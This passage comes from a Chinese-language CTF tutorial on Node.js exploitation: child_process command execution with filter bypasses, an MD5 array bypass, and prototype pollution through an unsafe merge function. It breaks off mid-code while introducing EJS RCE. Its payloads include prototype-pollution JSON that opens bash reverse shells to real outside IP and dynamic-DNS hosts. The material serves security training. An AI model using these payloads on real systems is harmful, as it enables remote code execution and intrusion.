punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spwanSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//加载模板：</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span>global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//禁用了exec，所以我们可以利用spawn</span>__filename <span class="token comment">//表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。</span>__dirname <span class="token comment">//表示当前执行脚本所在的目录。</span>__filename<span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/app/routes/index.js'</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>         <span class="token comment">//过滤exec|load</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'exe'</span><span class="token operator">+</span><span class="token string">'cSync'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//还有这样先利用readdirSync读取目录，然后readfileSync读取文件内容</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readdirSync</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'fl001g.txt'</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是考md5绕过</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload:?a[x]=1&amp;b[x]=2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>类似的还有</p><p>间隔两秒执行函数：</p><ul><li>setInteval(some_function, 2000)</li></ul><p>两秒后执行函数：</p><ul><li>setTimeout(some_function, 2000);</li></ul><p>some_function处就类似于eval函数的参数</p><p>输出HelloWorld：</p><ul><li>Function(“console.log(‘HelloWolrd’)”)()</li></ul><p>类似于php中的create_function</p><p>Function(importsKeys,xxx).apply(undefined, importsValues);</p><p>以上都可以导致命令执行</p><h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a><a href="https://so.csdn.net/so/search?q=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1001.2101.3001.7020">原型链</a>污染</h2><p>第一章中说到，<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>。那么，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改Foo类呢？</p><p>做个简单的实验：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// foo是一个简单的JavaScript对象</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// foo.bar 此时为1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 修改foo的原型（即Object）</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment">// 由于查找顺序的原因，foo.bar仍然是1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 此时再用Object创建一个空的zoo对象</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 查看zoo.bar</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，虽然zoo是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的结果居然是2：</p><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p><p><strong>注意，原型链污染只能污染未赋值的变量</strong></p><h2 id="原型链可以被污染的情况："><a href="#原型链可以被污染的情况：" class="headerlink" title="原型链可以被污染的情况："></a>原型链可以被污染的情况：</h2><h3 id="1、找能够控制数组（对象）的键名的操作"><a href="#1、找能够控制数组（对象）的键名的操作" class="headerlink" title="1、找能够控制数组（对象）的键名的操作"></a>1、找能够控制数组（对象）的<strong>键名</strong>的操作</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> ob1<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">let</span> ob2<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>ob1<span class="token punctuation">[</span><span class="token string">"__proto__"</span><span class="token punctuation">]</span><span class="token operator">=</span>ob2<span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span>ob1<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出：1（对象可以通过ob1["__proto__"]来赋值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、存在危险函数：merge、clone"><a href="#2、存在危险函数：merge、clone" class="headerlink" title="2、存在危险函数：merge、clone"></a>2、存在危险函数：merge、clone</h3><p>假如存在一个merge操作：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里没有对键值进行过滤，假如key为<code>__proto__</code>，那么就可以进行原型链污染。</p><p>这里需要注意，要配合<code>JSON.parse</code>使得我们输入的<code>__proto__</code>被解析成键名，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，否则它只会被当作当前对象的”原型“而不会向上影响，</p><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题。</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">></span><span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> o2<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">undefined</span><span class="token operator">></span>o2<span class="token punctuation">.</span>__proto__<span class="token operator">&lt;</span><span class="token punctuation">&#123;</span><span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span>           <span class="token comment">//直接返回对应值</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">undefined</span>        <span class="token comment">//并未污染原型</span><span class="token operator">></span><span class="token keyword">let</span> o3 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>o3<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token keyword">undefined</span><span class="token operator">></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">2</span>                <span class="token comment">//原型被成功污染</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原型链污染配合命令执行，<strong>getshell</strong></p><p>login.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>common.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">copy</span><span class="token operator">:</span>copy<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//原型链污染 类似于merge（键可控）</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：抓包修改POST的数据：</p><p> <code>&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code> </p><p>简单对象{}的原型就就是Object,通过污染{}的原型可以污染整个原型链</p><p>login.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对login.js POST：<code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/175.178.196.226/12345 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code>就为Object增加一个属性，然后就可以变量覆盖</p><p>login.js变为</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要两层原型链污染</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/468r00w865.oicp.vip/54996 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p><h3 id="3、express"><a href="#3、express" class="headerlink" title="3、express"></a>3、express</h3><p>可以知道<code>HTML</code>页面是用<code>Express</code>框架来渲染的，而页面的返回结果是用<code>res.render()</code>来渲染(<code>res</code>是<code>response</code>缩写)。所以尝试从这里下手，跟进模板渲染寻找可以原型链污染的点。</p><h3 id="4、ejsRCE"><a href="#4、ejsRCE" class="headerlink" title="4、ejsRCE"></a>4、ejsRCE</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> createError <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-errors'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token 